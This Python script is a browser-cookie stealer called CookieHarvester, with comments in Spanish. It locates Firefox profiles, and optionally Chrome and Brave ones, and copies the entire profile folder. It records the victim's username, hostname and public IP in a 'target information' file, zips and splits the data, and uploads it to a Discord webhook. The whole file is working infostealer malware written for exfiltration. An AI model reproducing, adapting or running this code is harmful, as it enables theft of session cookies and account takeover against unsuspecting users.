#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
CookieHarvester v1.0
- Desarrollado por Bankai-HackingDev.
- Probado en entornos como Fedora 44 KDE y Linux Mint 22.3 Zena.
- Basado en lenguaje Python con importaciones.
- Con división de 8 MB por archivo con mas reintentos.
- Añade nombre único en ZIP y archivo info.txt.
- Soporte opcional para Chrome y Brave.
"""
from dotenv import load_dotenv
import os
import sys
import time
import shutil
import zipfile
import tempfile
import requests
import subprocess
import socket
import getpass
from math import ceil
from datetime import datetime

# ============================================================
#                  CONFIGURACIÓN
# ============================================================
load_dotenv()
DISCORD_WEBHOOK_URL = os.getenv("API_DISCORD")
MAX_SIZE_MB = 8
AUTODESTRUIR = False
SOPORTE_CHROME = False   # Activar para Chrome/Brave (experimental)

# ============================================================
#               DETECCIÓN DE NAVEGADORES ABIERTOS
# ============================================================
if not DISCORD_WEBHOOK_URL:
    raise ValueError("No hay API de Discord en .env")
    
def navegador_abierto(nombre_proceso):
    try:
        resultado = subprocess.run(['pgrep', '-x', nombre_proceso], capture_output=True, text=True)
        return resultado.returncode == 0
    except:
        return False

def detectar_navegadores_abiertos():
    procesos = {
        'firefox': 'Firefox',
        'chrome': 'Chrome',
        'chromium': 'Chromium',
        'brave': 'Brave',
        'microsoft-edge': 'Edge',
    }
    abiertos = []
    for proc, nombre in procesos.items():
        if navegador_abierto(proc):
            abiertos.append(nombre)
    return abiertos

# ============================================================
#               LOCALIZACIÓN DE PERFILES
# ============================================================
def encontrar_perfil_firefox():
    base = os.path.expanduser('~')
    rutas_posibles = [
        os.path.join(base, '.mozilla', 'firefox'),
        os.path.join(base, '.config', 'mozilla', 'firefox'),
        os.path.join(base, '.config', '.mozilla', 'firefox'),
        os.path.join(base, '.var', 'app', 'org.mozilla.firefox', '.mozilla', 'firefox'),
        os.path.join(base, 'snap', 'firefox', 'common', '.mozilla', 'firefox'),
    ]
    for ruta_base in rutas_posibles:
        if not os.path.exists(ruta_base):
            continue
        for perfil in os.listdir(ruta_base):
            if perfil.endswith('.default-release') or perfil.endswith('.default'):
                ruta_perfil = os.path.join(ruta_base, perfil)
                if os.path.exists(os.path.join(ruta_perfil, 'cookies.sqlite')):
                    return ruta_perfil
    return None

def encontrar_perfil_chrome():
    if not SOPORTE_CHROME:
        return None
    base = os.path.expanduser('~')
    rutas = [
        os.path.join(base, '.config', 'google-chrome', 'Default'),
        os.path.join(base, '.var', 'app', 'com.google.Chrome', 'config', 'google-chrome', 'Default'),
    ]
    for ruta in rutas:
        if os.path.exists(os.path.join(ruta, 'Network', 'Cookies')):
            return ruta
    return None

def encontrar_perfil_brave():
    if not SOPORTE_CHROME:
        return None
    base = os.path.expanduser('~')
    ruta = os.path.join(base, '.config', 'BraveSoftware', 'Brave-Browser', 'Default')
    if os.path.exists(os.path.join(ruta, 'Network', 'Cookies')):
        return ruta
    return None

# ============================================================
#               COPIA DE CARPETA COMPLETA
# ============================================================
def copiar_carpeta(origen, destino):
    try:
        if os.path.exists(destino):
            shutil.rmtree(destino)
        shutil.copytree(origen, destino, symlinks=False, ignore_dangling_symlinks=True)
        return True
    except Exception as e:
        print(f"    [!] Error copiando: {e}")
        return False

# ============================================================
#               CREACIÓN DE INFO.TXT
# ============================================================
def crear_info_txt(destino, ip_publica, navegadores_abiertos, navegador_nombre):
    with open(destino, 'w') as f:
        f.write("=" * 50 + "\n")
        f.write("  C4-CookieHarvester - Información del objetivo\n")
        f.write("=" * 50 + "\n")
        f.write(f"Usuario: {getpass.getuser()}\n")
        f.write(f"Equipo: {socket.gethostname()}\n")
        f.write(f"Sistema: {sys.platform}\n")
        f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"IP Pública: {ip_publica}\n")
        f.write(f"Navegador: {navegador_nombre}\n")
        f.write(f"Navegadores abiertos: {', '.join(navegadores_abiertos) if navegadores_abiertos else 'Ninguno'}\n")

# ============================================================
#               COMPRESIÓN Y DIVISIÓN
# ============================================================
def crear_zip_desde_carpeta(carpeta_origen, zip_destino):
    with zipfile.ZipFile(zip_destino, 'w', zipfile.ZIP_DEFLATED) as zf:
        for root, _, files in os.walk(carpeta_origen):
            for file in files:
                full_path = os.path.join(root, file)
                arcname = os.path.relpath(full_path, carpeta_origen)
                zf.write(full_path, arcname)
    return zip_destino

def dividir_zip_en_partes(zip_path, max_size_mb=8):
    max_bytes = max_size_mb * 1024 * 1024
    file_size = os.path.getsize(zip_path)
    if file_size <= max_bytes:
        return [zip_path]
    parts = []
    base_name = os.path.splitext(zip_path)[0]
    with open(zip_path, 'rb') as f:
        data = f.read()
    total_parts = ceil(file_size / max_bytes)
    for i in range(total_parts):
        part_path = f"{base_name}_part{i+1}.zip"
        with open(part_path, 'wb') as pf:
            pf.write(data[i*max_bytes:(i+1)*max_bytes])
        parts.append(part_path)
    return parts

# ============================================================
#               ENVÍO A DISCORD
# ============================================================
def enviar_a_discord(webhook_url, zip_path, caption=None, intento=1, max_intentos=3):
    try:
        with open(zip_path, 'rb') as f:
            files = {'file': (os.path.basename(zip_path), f, 'application/zip')}
            data = {}
            if caption:
                data['content'] = caption[:1000]
            response = requests.post(webhook_url, files=files, data=data, timeout=30)
        if response.status_code in [200, 204]:
            return True
        elif intento < max_intentos:
            time.sleep(2 ** intento)
            return enviar_a_discord(webhook_url, zip_path, caption, intento+1, max_intentos)
        else:
            return False
    except:
        if intento < max_intentos:
            time.sleep(2 ** intento)
            return enviar_a_discord(webhook_url, zip_path, caption, intento+1, max_intentos)
        return False

# ============================================================
#               PROCESAR UN PERFIL
# ============================================================
def procesar_perfil(perfil_path, nombre_navegador, temp_dir, ip_publica, navegadores_abiertos):
    # Crear carpeta de copia
    carpeta_copia = os.path.join(temp_dir, f"{nombre_navegador}_perfil")
    if not copiar_carpeta(perfil_path, carpeta_copia):
        return False

    # Añadir info.txt
    info_path = os.path.join(carpeta_copia, "info.txt")
    crear_info_txt(info_path, ip_publica, navegadores_abiertos, nombre_navegador)

    # Crear ZIP con nombre único
    fecha = datetime.now().strftime('%Y-%m-%d')
    nombre_base = f"{ip_publica.replace('.', '_')}_{getpass.getuser()}_{socket.gethostname()}_{fecha}_{nombre_navegador}"
    zip_path = os.path.join(temp_dir, f"{nombre_base}.zip")
    crear_zip_desde_carpeta(carpeta_copia, zip_path)

    # Dividir y enviar
    parts = dividir_zip_en_partes(zip_path, MAX_SIZE_MB)
    exitos = 0
    for idx, part in enumerate(parts, 1):
        caption = f"📁 **{nombre_navegador}** - Parte {idx}/{len(parts)} | {nombre_base}"
        if enviar_a_discord(DISCORD_WEBHOOK_URL, part, caption):
            exitos += 1
        time.sleep(1)
    return exitos == len(parts)

# ============================================================
#                     FUNCIÓN PRINCIPAL
# ============================================================
def main():
    print("=" * 60)
    print("  C4-CookieHarvester v5.3.4 - STABLE LIGHT")
    print("=" * 60)

    usuario = getpass.getuser()
    equipo = socket.gethostname()
    print(f"[+] Objetivo: {usuario}@{equipo}")

    try:
        ip_publica = requests.get('https://api.ipify.org', timeout=5).text
        print(f"[+] IP Pública: {ip_publica}")
    except:
        ip_publica = "No disponible"
        print("[+] IP Pública: No disponible")

    abiertos = detectar_navegadores_abiertos()
    if abiertos:
        print(f"⚠️  Navegadores ABIERTOS: {', '.join(abiertos)}")
    else:
        print("✅ No hay navegadores abiertos.")

    temp_dir = tempfile.mkdtemp(prefix="c4_")

    # Buscar perfiles
    perfiles = []
    firefox_path = encontrar_perfil_firefox()
    if firefox_path:
        perfiles.append((firefox_path, "Firefox"))

    if SOPORTE_CHROME:
        chrome_path = encontrar_perfil_chrome()
        if chrome_path:
            perfiles.append((chrome_path, "Chrome"))
        brave_path = encontrar_perfil_brave()
        if brave_path:
            perfiles.append((brave_path, "Brave"))

    if not perfiles:
        print("[!] No se encontraron perfiles de navegadores.")
        sys.exit(1)

    print(f"\n[+] Perfiles encontrados: {len(perfiles)}")
    for path, nombre in perfiles:
        print(f"    - {nombre}: {path}")

    for perfil_path, nombre in perfiles:
        print(f"\n[*] Procesando: {nombre}")
        exito = procesar_perfil(perfil_path, nombre, temp_dir, ip_publica, abiertos)
        if exito:
            print(f"[+] {nombre} procesado correctamente.")
        else:
            print(f"[!] {nombre} tuvo errores.")

    shutil.rmtree(temp_dir, ignore_errors=True)
    print("\n[+] Limpieza completada.")
    print("=" * 60)

if __name__ == "__main__":
    main()